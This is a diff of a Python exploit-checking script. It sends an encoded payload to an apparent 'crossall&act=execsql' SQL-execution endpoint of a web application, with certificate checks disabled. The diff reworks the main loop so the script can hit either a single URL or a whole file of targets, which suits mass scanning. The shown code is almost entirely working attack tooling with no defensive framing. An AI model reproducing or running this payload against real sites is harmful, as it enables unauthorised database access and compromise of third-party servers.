@@ -9,7 +9,7 @@ def check(target):
     url = '/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5'
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': '*/*'
-               }
+              }
     try:
         resp = requests.get(target + url, timeout=30,
                             headers=headers, verify=False)
@@ -32,8 +32,10 @@ def main(args):
         except FileNotFoundError:
             print(f"Error: File '{args.file}' not found.")
             exit(1)
-    for f in file_content:
-        check(f.strip())
+        for f in file_content:
+            check(f.strip())
+    else:
+        check(args.url)
 
 
 if __name__ == "__main__":
